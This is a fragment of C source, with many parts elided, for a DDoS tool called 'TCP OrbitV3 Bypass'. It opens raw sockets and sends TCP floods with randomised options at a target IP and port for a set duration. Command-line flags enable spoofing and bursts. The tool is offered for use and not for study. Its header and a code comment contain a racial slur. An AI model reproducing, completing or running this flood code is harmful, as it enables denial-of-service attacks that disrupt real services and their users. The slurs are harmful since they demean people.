/*
 * TCP OrbitV3 Bypass - Standalone x86/x64
 * by c0re_x64 for 0v.lol // nigga
 * usage: sudo ./orbitv3 <ip> <port> <threads> <duration> [--spoof] [--burst N] [--size N]
 */
...
static struct orbitv3_config config;
...
static uint32_t rand_next(void) {
    ...
    rand_state[3] ^= rand_state[3] >> 19; rand_state[3] ^= t;
    return rand_state[3];
}
...
static void build_tcp_adv_opts(uint8_t *o, uint32_t tsval, uint32_t tsecr, uint16_t mss, uint8_t wscale, int *len) {
    int off = 0;
...
// nigga orbitv3 flood
static void* orbitv3_thread(void *arg) {
    int tid = *(int *)arg; free(arg);
    int raw = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw < 0) { fprintf(stderr, "[%d] raw socket\n", tid); return NULL; }
    int one = 1;
    ...
    dst.sin_port = htons(config.target_port);
    uint8_t packet[2048];
    ...
    while (config.running && time(NULL) < end) {
        for (uint32_t t = 0; t < config.threads; t++) {
            ...
            int opt_len = 0;
            build_tcp_adv_opts(opts, rand_next(), 0, 1400 + (rand_next() & 0x0f), 6, &opt_len);
...
int main(int argc, char **argv) {
    if (argc < 5) {
        printf("orbitv3 <ip> <port> <threads> <duration> [--spoof][--burst N][--size N][--df]\n");
        return 1;
    }
    ...
    config.sport = config.dport = 0xFFFF;
    config.dport = config.target_port;
    config.data_len = 0; config.burst = 4;
    config.running = 1;
